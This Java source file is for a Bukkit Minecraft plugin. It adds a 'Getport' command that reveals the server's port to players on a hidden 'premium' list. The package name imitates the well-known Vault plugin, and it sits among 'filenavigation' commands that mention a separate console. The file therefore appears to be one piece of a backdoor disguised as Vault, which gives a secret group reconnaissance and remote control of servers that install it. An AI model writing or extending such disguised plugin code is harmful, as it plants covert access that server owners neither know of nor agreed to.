package net.milkbowl.vault.commands.cmds.filenavigation;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Getport extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
		p.sendMessage(Settings.PREFIX("The server port is " + Settings.HIGHLIGHT_COLOUR + Bukkit.getServer().getPort() + Settings.SECONDARY_COLOUR + "(this port won't work for the " + Settings.NAME + " console)"));
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
